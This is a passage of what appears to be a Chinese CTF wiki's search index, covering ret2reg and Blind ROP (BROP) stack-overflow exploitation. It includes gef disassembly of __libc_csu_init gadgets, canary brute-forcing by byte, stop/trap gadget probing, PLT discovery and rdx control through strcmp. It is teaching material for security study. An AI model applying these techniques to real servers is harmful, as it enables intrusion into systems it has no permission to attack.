\u27a4 x / 5 i 0x000000000040061e 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x000000000040061f 0 x40061f < __libc_csu_init + 95 > : pop rbp 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x0000000000400620 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop 0 x400626: nop WORD PTR cs :[ rax + rax * 1 + 0x0 ] gef \u27a4 x / 5 i 0x0000000000400621 0 x400621 < __libc_csu_init + 97 > : pop rsi 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop gef \u27a4 x / 5 i 0x000000000040061A + 9 0 x400623 < __libc_csu_init + 99 > : pop rdi 0 x400624 < __libc_csu_init + 100 > : ret 0x400625 : nop 0 x400626: nop WORD PTR cs :[ rax + rax * 1 + 0x0 ] 0 x400630 < __libc_csu_fini > : repz ret","title":"gadget"},{"location":"pwn/stackoverflow/medium_rop/#_5","text":"2016 XDCTF pwn100 2016 \u534e\u5c71\u676f SU_PWN","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/medium_rop/#_6","text":"http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/stackoverflow/medium_rop/#ret2reg","text":"","title":"ret2reg"},{"location":"pwn/stackoverflow/medium_rop/#_7","text":"\u67e5\u770b\u6ea2\u51fa\u51fd\u8fd4\u56de\u65f6\u54ea\u4e2a\u5bc4\u5b58\u503c\u6307\u5411\u6ea2\u51fa\u7f13\u51b2\u533a\u7a7a\u95f4 \u7136\u540e\u53cd\u7f16\u8bd1\u4e8c\u8fdb\u5236\uff0c\u67e5\u627e call reg \u6216\u8005jmp reg\u6307\u4ee4\uff0c\u5c06 EIP \u8bbe\u7f6e\u4e3a\u8be5\u6307\u4ee4\u5730\u5740 reg\u6240\u6307\u5411\u7684\u7a7a\u95f4\u4e0a\u6ce8\u5165 Shellcode (\u9700\u8981\u786e\u4fdd\u8be5\u7a7a\u95f4\u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u4f46\u901a\u5e38\u90fd\u662f\u6808\u4e0a\u7684)","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/medium_rop/#brop","text":"","title":"BROP"},{"location":"pwn/stackoverflow/medium_rop/#_8","text":"BROP(Blind ROP)\u4e8e2014\u5e74\u7531Standford\u7684Andrea Bittau\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76\u6210\u679c\u53d1\u8868\u5728Oakland 2014\uff0c\u5176\u8bba\u6587\u9898\u76ee\u662f Hacking Blind \uff0c\u4e0b\u9762\u662f\u4f5c\u8005\u5bf9\u5e94\u7684paper\u548cslides,\u4ee5\u53ca\u4f5c\u8005\u76f8\u5e94\u7684\u4ecb\u7ecd paper slide BROP\u662f\u6ca1\u6709\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u6216\u8005\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e0b\uff0c\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/medium_rop/#_9","text":"\u6e90\u7a0b\u5e8f\u5fc5\u987b\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4ee5\u4fbf\u4e8e\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002 \u670d\u52a1\u5668\u7aef\u7684\u8fdb\u7a0b\u5728\u5d29\u6e83\u4e4b\u540e\u4f1a\u91cd\u65b0\u542f\u52a8\uff0c\u5e76\u4e14\u91cd\u65b0\u542f\u52a8\u7684\u8fdb\u7a0b\u7684\u5730\u5740\u4e0e\u5148\u524d\u7684\u5730\u5740\u4e00\u6837\uff08\u8fd9\u4e5f\u5c31\u662f\u8bf4\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4f46\u662f\u5176\u53ea\u662f\u5728\u7a0b\u5e8f\u6700\u521d\u542f\u52a8\u7684\u65f6\u5019\u6709\u6548\u679c\uff09\u3002\u76ee\u524dnginx, MySQL, Apache, OpenSSH\u7b49\u670d\u52a1\u5668\u5e94\u7528\u90fd\u662f\u7b26\u5408\u8fd9\u79cd\u7279\u6027\u7684\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"pwn/stackoverflow/medium_rop/#_10","text":"\u76ee\u524d\uff0c\u5927\u90e8\u5206\u5e94\u7528\u90fd\u4f1a\u5f00\u542fASLR\u3001NX\u3001Canary\u4fdd\u62a4\u3002\u8fd9\u91cc\u6211\u4eec\u5206\u522b\u8bb2\u89e3\u5728BROP\u4e2d\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\uff0c\u4ee5\u53ca\u5982\u4f55\u8fdb\u884c\u653b\u51fb\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"pwn/stackoverflow/medium_rop/#_11","text":"\u5728BROP\u4e2d\uff0c\u57fa\u672c\u7684\u9075\u5faa\u7684\u601d\u8def\u5982\u4e0b \u5224\u65ad\u6808\u6ea2\u51fa\u957f\u5ea6 \u66b4\u529b\u679a\u4e3e Stack Reading \u83b7\u53d6\u6808\u4e0a\u7684\u6570\u636e\u6765\u6cc4\u9732canaries\uff0c\u4ee5\u53caebp\u548c\u8fd4\u56de\u5730\u5740\u3002 Bind ROP \u627e\u5230\u8db3\u591f\u591a\u7684 gadgets \u6765\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5bf9\u5176\u8fdb\u884c\u8c03\u7528\uff0c\u6bd4\u5982\u8bf4\u5e38\u89c1\u7684 write \u51fd\u6570\u4ee5\u53caputs\u51fd\u6570\u3002 Build the exploit \u5229\u7528\u8f93\u51fa\u51fd\u6570\u6765 dump \u51fa\u7a0b\u5e8f\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u7684 gadgets\uff0c\u4ece\u800c\u53ef\u4ee5\u5199\u51fa\u6700\u540e\u7684 exploit\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"pwn/stackoverflow/medium_rop/#_12","text":"\u76f4\u63a5\u4ece1\u66b4\u529b\u679a\u4e3e\u5373\u53ef\uff0c\u76f4\u5230\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u3002","title":"\u6808\u6ea2\u51fa\u957f\u5ea6"},{"location":"pwn/stackoverflow/medium_rop/#stack-reading","text":"\u5982\u4e0b\u6240\u793a\uff0c\u8fd9\u662f\u76ee\u524d\u7ecf\u5178\u7684\u6808\u5e03\u5c40 buffer|canary|saved fame pointer|saved returned address \u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002 \u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002 canary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002","title":"Stack Reading"},{"location":"pwn/stackoverflow/medium_rop/#blind-rop","text":"","title":"Blind ROP"},{"location":"pwn/stackoverflow/medium_rop/#_13","text":"\u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002 pop rdi ; ret # socket pop rsi ; ret # buffer pop rdx ; ret # length pop rax ; ret # write syscall number syscall \u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"pwn/stackoverflow/medium_rop/#brop-gadgets","text":"\u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684","title":"BROP gadgets"},{"location":"pwn/stackoverflow/medium_rop/#find-a-call-write","text":"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002","title":"find a call write"},{"location":"pwn/stackoverflow/medium_rop/#control-rdx","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f pop rdx ; ret \u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002 \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879 \u5bfb\u627egadgets \u5bfb\u627ePLT\u8868 write\u5165\u53e3 strcmp\u5165\u53e3","title":"control rdx"},{"location":"pwn/stackoverflow/medium_rop/#gadgets","text":"\u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83 \u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83 \u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83 \u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65","title":"\u5bfb\u627egadgets"},{"location":"pwn/stackoverflow/medium_rop/#stop-gadgets","text":"\u6240\u8c13 stop gadget \u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002 \u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002 \u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684 useful gadget \uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86 stop gadget \uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002","title":"\u5bfb\u627estop gadgets"},{"location":"pwn/stackoverflow/medium_rop/#gadgets_1","text":"\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740 Probe \u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002 Stop \u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002 Trap \u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684 Stop \u4e0e Trap \u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50 probe,stop,traps(traps,traps,...) \u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426( \u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad )\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982 ret xor eax,eax; ret probe,trap,stop,traps \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982 pop rax; ret pop rdi; ret probe, trap, trap, trap, trap, trap, trap, stop, traps \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002 \u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c \u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9 plt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c _start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002 \u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002 \u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002 \u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d.","title":"\u8bc6\u522b gadgets"},{"location":"pwn/stackoverflow/medium_rop/#plt","text":"\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002","title":"\u5bfb\u627ePLT"},{"location":"pwn/stackoverflow/medium_rop/#rdx","text":"\u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002 \u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740 readable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002 bad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002 \u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5 strcmp(bad,bad) strcmp(bad,readable) strcmp(readable,bad) strcmp(readable,readable) 